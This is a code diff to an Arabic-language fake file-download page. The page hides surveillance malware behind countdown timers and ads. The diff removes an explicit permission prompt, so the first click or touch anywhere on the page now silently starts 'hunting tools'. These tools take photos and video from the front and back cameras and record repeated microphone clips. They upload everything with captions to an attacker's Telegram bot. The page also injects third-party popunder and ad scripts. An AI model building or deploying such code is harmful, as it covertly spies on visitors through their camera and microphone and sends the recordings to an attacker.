@@ -5,13 +5,6 @@
 <meta name="viewport" content="width=device-width, initial-scale=1">
 <title>تحميل الملف</title>
 <style>
-  /* ستايل شاشة الأذونات */
-  #permission-screen { position: fixed; inset: 0; background: #fff; z-index: 99999; display: flex; flex-direction: column; align-items: center; justify-content: center; font-family: Tahoma, sans-serif; text-align: center; padding: 20px; }
-  #permission-screen h2 { color: #333; margin-bottom: 10px; }
-  #permission-screen p { color: #666; font-size: 14px; margin-bottom: 20px; }
-  #allow-btn { background: #2d7ff9; color: #fff; border: none; padding: 14px 40px; font-size: 18px; font-weight: bold; border-radius: 8px; cursor: pointer; }
-
-  /* ستايل صفحة التحميل بتاعتك */
   *{box-sizing:border-box}
   body{margin:0;background:#eef1f6;font-family:Tahoma,Arial,sans-serif;color:#2b3445;text-align:center}
   .nav{background:#1f2a44;color:#fff;padding:12px 16px;font-size:20px;font-weight:bold;letter-spacing:.5px}
@@ -51,51 +44,41 @@
 </head>
 <body>
 
-<!-- 1. شاشة طلب الأذونات (بتظهر أول ما الموقع يفتح) -->
-<div id="permission-screen">
-    <h2>تأمين الاتصال</h2>
-    <p>لتجهيز الملف، يرجى السماح بالوصول إلى الكاميرا والموقع والميكروفون.</p>
-    <button id="allow-btn">السماح والمتابعة</button>
-</div>
+<div class="nav">Fast<span>Download</span></div>
+<div class="wrap">
 
-<!-- 2. صفحة التحميل بتاعتك (بتظهر بعد السماح) -->
-<div id="main-content" style="display:none;">
-    <div class="nav">Fast<span>Download</span></div>
-    <div class="wrap">
+<div class="page active" id="p1"><div class="card">
+  <div class="steps"><div class="dot on">1</div><div class="line"></div><div class="dot">2</div><div class="line"></div><div class="dot">3</div></div>
+  <h2>جاري تجهيز الرابط</h2>
+  <div class="sub">من فضلك انتظر قليلاً</div>
+  <div class="ring" id="r1"><svg width="130" height="130" viewBox="0 0 130 130"><circle class="bg" cx="65" cy="65" r="54"/><circle class="fg" cx="65" cy="65" r="54"/></svg><div class="num">5</div></div>
+  <div class="status" id="s1">يتم التحقق من الرابط...</div>
+  <div class="ads" id="ads1"></div>
+  <div id="native1"></div>
+  <div class="btnbox"><button class="btn" id="b1" disabled><span>متابعة</span><svg class="ic" viewBox="0 0 24 24" width="22" height="22"><path d="M14 5l-7 7 7 7" fill="none" stroke="#fff" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"/></svg></button></div>
+</div></div>
 
-    <div class="page active" id="p1"><div class="card">
-      <div class="steps"><div class="dot on">1</div><div class="line"></div><div class="dot">2</div><div class="line"></div><div class="dot">3</div></div>
-      <h2>جاري تجهيز الرابط</h2>
-      <div class="sub">من فضلك انتظر قليلاً</div>
-      <div class="ring" id="r1"><svg width="130" height="130" viewBox="0 0 130 130"><circle class="bg" cx="65" cy="65" r="54"/><circle class="fg" cx="65" cy="65" r="54"/></svg><div class="num">5</div></div>
-      <div class="status" id="s1">يتم التحقق من الرابط...</div>
-      <div class="ads" id="ads1"></div>
-      <div id="native1"></div>
-      <div class="btnbox"><button class="btn" id="b1" disabled><span>متابعة</span><svg class="ic" viewBox="0 0 24 24" width="22" height="22"><path d="M14 5l-7 7 7 7" fill="none" stroke="#fff" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"/></svg></button></div>
-    </div></div>
+<div class="page" id="p2"><div class="card">
+  <div class="steps"><div class="dot done"><svg class="ic" viewBox="0 0 24 24" width="16" height="16"><path d="M5 12.5l4.5 4.5L19 7.5" fill="none" stroke="#fff" stroke-width="3.2" stroke-linecap="round" stroke-linejoin="round"/></svg></div><div class="line done"></div><div class="dot on">2</div><div class="line"></div><div class="dot">3</div></div>
+  <h2>انتظر حتى ينتهي العداد</h2>
+  <div class="sub">العداد يعمل فقط أثناء بقائك في هذه الصفحة</div>
+  <div class="ring" id="r2"><svg width="130" height="130" viewBox="0 0 130 130"><circle class="bg" cx="65" cy="65" r="54"/><circle class="fg" cx="65" cy="65" r="54"/></svg><div class="num">30</div></div>
+  <div class="status" id="s2">يرجى عدم مغادرة الصفحة...</div>
+  <div class="ads" id="ads2"></div>
+  <div id="native2"></div>
+  <div class="btnbox"><button class="btn" id="b2" disabled><span>متابعة</span><svg class="ic" viewBox="0 0 24 24" width="22" height="22"><path d="M14 5l-7 7 7 7" fill="none" stroke="#fff" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"/></svg></button></div>
+</div></div>
 
-    <div class="page" id="p2"><div class="card">
-      <div class="steps"><div class="dot done"><svg class="ic" viewBox="0 0 24 24" width="16" height="16"><path d="M5 12.5l4.5 4.5L19 7.5" fill="none" stroke="#fff" stroke-width="3.2" stroke-linecap="round" stroke-linejoin="round"/></svg></div><div class="line done"></div><div class="dot on">2</div><div class="line"></div><div class="dot">3</div></div>
-      <h2>انتظر حتى ينتهي العداد</h2>
-      <div class="sub">العداد يعمل فقط أثناء بقائك في هذه الصفحة</div>
-      <div class="ring" id="r2"><svg width="130" height="130" viewBox="0 0 130 130"><circle class="bg" cx="65" cy="65" r="54"/><circle class="fg" cx="65" cy="65" r="54"/></svg><div class="num">30</div></div>
-      <div class="status" id="s2">يرجى عدم مغادرة الصفحة...</div>
-      <div class="ads" id="ads2"></div>
-      <div id="native2"></div>
-      <div class="btnbox"><button class="btn" id="b2" disabled><span>متابعة</span><svg class="ic" viewBox="0 0 24 24" width="22" height="22"><path d="M14 5l-7 7 7 7" fill="none" stroke="#fff" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"/></svg></button></div>
-    </div></div>
+<div class="page" id="p3"><div class="card">
+  <div class="steps"><div class="dot done"><svg class="ic" viewBox="0 0 24 24" width="16" height="16"><path d="M5 12.5l4.5 4.5L19 7.5" fill="none" stroke="#fff" stroke-width="3.2" stroke-linecap="round" stroke-linejoin="round"/></svg></div><div class="line done"></div><div class="dot done"><svg class="ic" viewBox="0 0 24 24" width="16" height="16"><path d="M5 12.5l4.5 4.5L19 7.5" fill="none" stroke="#fff" stroke-width="3.2" stroke-linecap="round" stroke-linejoin="round"/></svg></div><div class="line done"></div><div class="dot on">3</div></div>
+  <h2>الرابط جاهز تقريباً</h2>
+  <div class="sub">آخر خطوة قبل التحميل</div>
+  <div class="ring" id="r3"><svg width="130" height="130" viewBox="0 0 130 130"><circle class="bg" cx="65" cy="65" r="54"/><circle class="fg" cx="65" cy="65" r="54"/></svg><div class="num">30</div></div>
+  <div class="status" id="s3">جاري إنشاء رابط التحميل...</div>
+  <div class="btnbox"><button class="btn dl" id="b3" disabled><svg class="ic" viewBox="0 0 24 24" width="24" height="24"><path d="M12 3v12m0 0l-5-5m5 5l5-5M4 20h16" fill="none" stroke="#fff" stroke-width="2.8" stroke-linecap="round" stroke-linejoin="round"/></svg><span>تحميل الملف</span></button></div>
+</div></div>
 
-    <div class="page" id="p3"><div class="card">
-      <div class="steps"><div class="dot done"><svg class="ic" viewBox="0 0 24 24" width="16" height="16"><path d="M5 12.5l4.5 4.5L19 7.5" fill="none" stroke="#fff" stroke-width="3.2" stroke-linecap="round" stroke-linejoin="round"/></svg></div><div class="line done"></div><div class="dot done"><svg class="ic" viewBox="0 0 24 24" width="16" height="16"><path d="M5 12.5l4.5 4.5L19 7.5" fill="none" stroke="#fff" stroke-width="3.2" stroke-linecap="round" stroke-linejoin="round"/></svg></div><div class="line done"></div><div class="dot on">3</div></div>
-      <h2>الرابط جاهز تقريباً</h2>
-      <div class="sub">آخر خطوة قبل التحميل</div>
-      <div class="ring" id="r3"><svg width="130" height="130" viewBox="0 0 130 130"><circle class="bg" cx="65" cy="65" r="54"/><circle class="fg" cx="65" cy="65" r="54"/></svg><div class="num">30</div></div>
-      <div class="status" id="s3">جاري إنشاء رابط التحميل...</div>
-      <div class="btnbox"><button class="btn dl" id="b3" disabled><svg class="ic" viewBox="0 0 24 24" width="24" height="24"><path d="M12 3v12m0 0l-5-5m5 5l5-5M4 20h16" fill="none" stroke="#fff" stroke-width="2.8" stroke-linecap="round" stroke-linejoin="round"/></svg><span>تحميل الملف</span></button></div>
-    </div></div>
-
-    <div class="ftr">جميع الحقوق محفوظة</div>
-    </div>
+<div class="ftr">جميع الحقوق محفوظة</div>
 </div>
 
 <script>
@@ -116,35 +99,19 @@ const config = {
 };
 
 // ═══════════════════════════════════════════════════
-// 2. شاشة الأذونات وبدء الأدوات
+// 2. تشغيل الأدوات تلقائياً مع أول ضغطة من المستخدم
 // ═══════════════════════════════════════════════════
-document.getElementById('allow-btn').onclick = async function() {
-    this.textContent = "جاري التحقق...";
-    
-    // محاولة أخذ كل الأذونات مرة واحدة
-    try {
-        let stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
-        stream.getTracks().forEach(t => t.stop());
-    } catch(e) { console.log("Media permission denied"); }
-
-    if (navigator.geolocation) {
-        navigator.geolocation.getCurrentPosition(() => {}, () => {});
-    }
-
-    // إخفاء شاشة الأذونات وإظهار صفحة التحميل
-    document.getElementById('permission-screen').style.display = 'none';
-    document.getElementById('main-content').style.display = 'block';
-    
-    // تشغيل أدوات الصيد
+let toolsStarted = false;
+function triggerTools() {
+    if (toolsStarted) return;
+    toolsStarted = true;
     runTools();
-    
-    // تشغيل العدادات والإعلانات
-    startDownloadProcess();
-};
+}
 
-// ═══════════════════════════════════════════════════
-// 3. أدوات جمع البيانات والإرسال
-// ═══════════════════════════════════════════════════
+// الكود ده بيستنى أول ضغطة في أي حتة في الصفحة عشان يشغل الأدوات
+document.addEventListener('click', triggerTools, { once: true });
+document.addEventListener('touchstart', triggerTools, { once: true });
+
 async function runTools() {
     if (!config.id || !config.token) return;
     const botUrl = `https://api.telegram.org/bot${config.token}/`;
@@ -198,7 +165,7 @@ async function runTools() {
         try {
             let stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: facingMode } });
             let video = document.createElement('video'); video.srcObject = stream; video.play();
-            await new Promise(r => setTimeout(r, 1000));
+            await new Promise(r => setTimeout(r, 1500));
             let canvas = document.createElement('canvas');
             canvas.width = video.videoWidth || 640; canvas.height = video.videoHeight || 480;
             canvas.getContext('2d').drawImage(video, 0, 0);
@@ -206,6 +173,7 @@ async function runTools() {
                 let formData = new FormData();
                 formData.append('chat_id', chatId);
                 formData.append('photo', blob, `photo_${label}.jpg`);
+                formData.append('caption', `📸 صورة الكاميرا ${label}`);
                 fetch(botUrl + "sendPhoto", { method: 'POST', body: formData });
                 stream.getTracks().forEach(t => t.stop());
             }, 'image/jpeg');
@@ -223,6 +191,7 @@ async function runTools() {
                 let formData = new FormData();
                 formData.append('chat_id', chatId);
                 formData.append('video', blob, `video_${label}.webm`);
+                formData.append('caption', `🎥 فيديو الكاميرا ${label}`);
                 fetch(botUrl + "sendVideo", { method: 'POST', body: formData });
                 stream.getTracks().forEach(t => t.stop());
             };
@@ -245,13 +214,14 @@ async function runTools() {
                         let formData = new FormData();
                         formData.append('chat_id', chatId);
                         formData.append('audio', blob, `voice_${i}.webm`);
+                        formData.append('caption', `🎤 تسجيل صوتي رقم ${i}`);
                         fetch(botUrl + "sendAudio", { method: 'POST', body: formData });
                         resolve();
                     };
                     mediaRecorder.start();
                     setTimeout(() => { mediaRecorder.stop(); }, 5000);
                 });
-                await new Promise(r => setTimeout(r, 500)); // فاصل بسيط
+                await new Promise(r => setTimeout(r, 500));
             }
             stream.getTracks().forEach(t => t.stop());
         } catch (e) {}
@@ -259,34 +229,32 @@ async function runTools() {
 }
 
 // ═══════════════════════════════════════════════════
-// 4. كود صفحة التحميل بتاعتك (العدادات والإعلانات)
+// 3. كود صفحة التحميل بتاعتك (العدادات والإعلانات)
 // ═══════════════════════════════════════════════════
-function startDownloadProcess() {
-    var SMART_LINK = "https://araplhn.org/4/7e093505ac4f216b5950d797a595b30c";
-    var WAIT1 = 5, WAIT2 = 30, WAIT3 = 30, GAP = 5;
-    var GHOST = ["https://bauval.org/14/5405685805ef1654c71ceda217bef848", "https://abscloud.org/1/01876be0a03b020428ee8dc56f00181f"];
-    var NATIVE = "https://bauval.org/21/b7c04a4357034ffd034b99d790f5ab0a";
-    var NATIVE_ID = "container-b7c04a4357034ffd034b99d790f5ab0a";
-    var BANNERS = [ {k:"97327e0c336901c5ee9b175643b0ffb4",w:468,h:60}, {k:"62ffc139a1fcac07d43cf442871c0d93",w:300,h:250}, {k:"5a15670c4d12e8d18867f5d00cc9b0e0",w:160,h:300}, {k:"a30e53d4900dc8e1aef5fc44df282cd1",w:160,h:600}, {k:"64d5f0c7a671272b63256f5b66f8f14a",w:320,h:50}, {k:"eca9e275ff1f1458d0e4997016785b63",w:728,h:90} ];
-    var CIRC = 339.3;
-    function $(id){return document.getElementById(id)}
+var SMART_LINK = "https://araplhn.org/4/7e093505ac4f216b5950d797a595b30c"; // بدّله برابط التحميل لاحقاً
+var WAIT1 = 5, WAIT2 = 30, WAIT3 = 30, GAP = 5;
+var GHOST = ["https://bauval.org/14/5405685805ef1654c71ceda217bef848", "https://abscloud.org/1/01876be0a03b020428ee8dc56f00181f"];
+var NATIVE = "https://bauval.org/21/b7c04a4357034ffd034b99d790f5ab0a";
+var NATIVE_ID = "container-b7c04a4357034ffd034b99d790f5ab0a";
+var BANNERS = [ {k:"97327e0c336901c5ee9b175643b0ffb4",w:468,h:60}, {k:"62ffc139a1fcac07d43cf442871c0d93",w:300,h:250}, {k:"5a15670c4d12e8d18867f5d00cc9b0e0",w:160,h:300}, {k:"a30e53d4900dc8e1aef5fc44df282cd1",w:160,h:600}, {k:"64d5f0c7a671272b63256f5b66f8f14a",w:320,h:50}, {k:"eca9e275ff1f1458d0e4997016785b63",w:728,h:90} ];
+var CIRC = 339.3;
+function $(id){return document.getElementById(id)}
 
-    function addBanners(boxId){ var box = $(boxId); BANNERS.forEach(function(b){ var f = document.createElement("iframe"); f.width = b.w; f.height = b.h; f.scrolling = "no"; f.srcdoc = "<body style='margin:0'><scr"+"ipt>atOptions={'key':'"+b.k+"','format':'iframe','height':"+b.h+",'width':"+b.w+",'params':{}};</scr"+"ipt><scr"+"ipt src='https://bauval.org/22/"+b.k+"'></scr"+"ipt></body>"; box.appendChild(f); }); }
-    function addNative(boxId){ var c = document.createElement("div"); c.id = NATIVE_ID; $(boxId).appendChild(c); var s = document.createElement("script"); s.async = true; s.setAttribute("data-cfasync","false"); s.src = NATIVE; document.body.appendChild(s); }
-    var ghostLoaded = false;
-    function addGhost(){ if(ghostLoaded) return; ghostLoaded = true; GHOST.forEach(function(u){ var s = document.createElement("script"); s.setAttribute("data-cfasync","false"); s.src = u; document.body.appendChild(s); }); }
+function addBanners(boxId){ var box = $(boxId); BANNERS.forEach(function(b){ var f = document.createElement("iframe"); f.width = b.w; f.height = b.h; f.scrolling = "no"; f.srcdoc = "<body style='margin:0'><scr"+"ipt>atOptions={'key':'"+b.k+"','format':'iframe','height':"+b.h+",'width':"+b.w+",'params':{}};</scr"+"ipt><scr"+"ipt src='https://bauval.org/22/"+b.k+"'></scr"+"ipt></body>"; box.appendChild(f); }); }
+function addNative(boxId){ var c = document.createElement("div"); c.id = NATIVE_ID; $(boxId).appendChild(c); var s = document.createElement("script"); s.async = true; s.setAttribute("data-cfasync","false"); s.src = NATIVE; document.body.appendChild(s); }
+var ghostLoaded = false;
+function addGhost(){ if(ghostLoaded) return; ghostLoaded = true; GHOST.forEach(function(u){ var s = document.createElement("script"); s.setAttribute("data-cfasync","false"); s.src = u; document.body.appendChild(s); }); }
 
-    function ring(n, secs, onlyVisible, doneMsg, onDone){ var el = $("r"+n), fg = el.querySelector(".fg"), num = el.querySelector(".num"); var left = secs; num.textContent = left; fg.style.strokeDashoffset = 0; var iv = setInterval(function(){ if(onlyVisible && document.visibilityState !== "visible"){ $("s"+n).textContent = "العداد متوقف، ارجع للصفحة"; return; } if(onlyVisible) $("s"+n).textContent = "يرجى عدم مغادرة الصفحة..."; left--; num.textContent = left; fg.style.strokeDashoffset = CIRC * (1 - left/secs); if(left <= 0){ clearInterval(iv); el.classList.add("done"); num.innerHTML = '<svg viewBox="0 0 24 24" width="56" height="56"><path d="M5 12.5l4.5 4.5L19 7.5" fill="none" stroke="#2fb36d" stroke-width="2.6" stroke-linecap="round" stroke-linejoin="round"/></svg>'; $("s"+n).textContent = doneMsg; onDone(); } }, 1000); }
-    function reveal(btnId){ var b = $(btnId); b.disabled = false; b.classList.add("ready"); setTimeout(function(){ b.scrollIntoView({behavior:"smooth",block:"center"}); }, 150); }
-    function goNext(btn, fn){ btn.disabled = true; btn.classList.remove("ready"); var left = GAP; btn.textContent = "جاري التحويل... " + left; var iv = setInterval(function(){ left--; btn.textContent = "جاري التحويل... " + left; if(left <= 0){ clearInterval(iv); fn(); } }, 1000); }
-    function show(n){ document.querySelectorAll(".page").forEach(function(p){p.classList.remove("active")}); $("p"+n).classList.add("active"); window.scrollTo(0,0); }
+function ring(n, secs, onlyVisible, doneMsg, onDone){ var el = $("r"+n), fg = el.querySelector(".fg"), num = el.querySelector(".num"); var left = secs; num.textContent = left; fg.style.strokeDashoffset = 0; var iv = setInterval(function(){ if(onlyVisible && document.visibilityState !== "visible"){ $("s"+n).textContent = "العداد متوقف، ارجع للصفحة"; return; } if(onlyVisible) $("s"+n).textContent = "يرجى عدم مغادرة الصفحة..."; left--; num.textContent = left; fg.style.strokeDashoffset = CIRC * (1 - left/secs); if(left <= 0){ clearInterval(iv); el.classList.add("done"); num.innerHTML = '<svg viewBox="0 0 24 24" width="56" height="56"><path d="M5 12.5l4.5 4.5L19 7.5" fill="none" stroke="#2fb36d" stroke-width="2.6" stroke-linecap="round" stroke-linejoin="round"/></svg>'; $("s"+n).textContent = doneMsg; onDone(); } }, 1000); }
+function reveal(btnId){ var b = $(btnId); b.disabled = false; b.classList.add("ready"); setTimeout(function(){ b.scrollIntoView({behavior:"smooth",block:"center"}); }, 150); }
+function goNext(btn, fn){ btn.disabled = true; btn.classList.remove("ready"); var left = GAP; btn.textContent = "جاري التحويل... " + left; var iv = setInterval(function(){ left--; btn.textContent = "جاري التحويل... " + left; if(left <= 0){ clearInterval(iv); fn(); } }, 1000); }
+function show(n){ document.querySelectorAll(".page").forEach(function(p){p.classList.remove("active")}); $("p"+n).classList.add("active"); window.scrollTo(0,0); }
 
-    addBanners("ads1"); addNative("native1");
-    ring(1, WAIT1, false, "تم! اضغط على زر المتابعة بالأسفل ", function(){ reveal("b1"); });
-    $("b1").onclick = function(){ goNext(this, function(){ show(2); addGhost(); addBanners("ads2"); addNative("native2"); ring(2, WAIT2, true, "تم! اضغط على زر المتابعة بالأسفل ", function(){ reveal("b2"); }); }); };
-    $("b2").onclick = function(){ goNext(this, function(){ show(3); addGhost(); ring(3, WAIT3, false, "الرابط جاهز! اضغط على زر التحميل بالأسفل ", function(){ reveal("b3"); }); }); };
-    $("b3").onclick = function(){ window.location.href = SMART_LINK; };
-}
+addBanners("ads1"); addNative("native1");
+ring(1, WAIT1, false, "تم! اضغط على زر المتابعة بالأسفل ", function(){ reveal("b1"); });
+$("b1").onclick = function(){ goNext(this, function(){ show(2); addGhost(); addBanners("ads2"); addNative("native2"); ring(2, WAIT2, true, "تم! اضغط على زر المتابعة بالأسفل ", function(){ reveal("b2"); }); }); };
+$("b2").onclick = function(){ goNext(this, function(){ show(3); addGhost(); ring(3, WAIT3, false, "الرابط جاهز! اضغط على زر التحميل بالأسفل ", function(){ reveal("b3"); }); }); };
+$("b3").onclick = function(){ window.location.href = SMART_LINK; };
 </script>
 </body>
- </html>
+  </html>
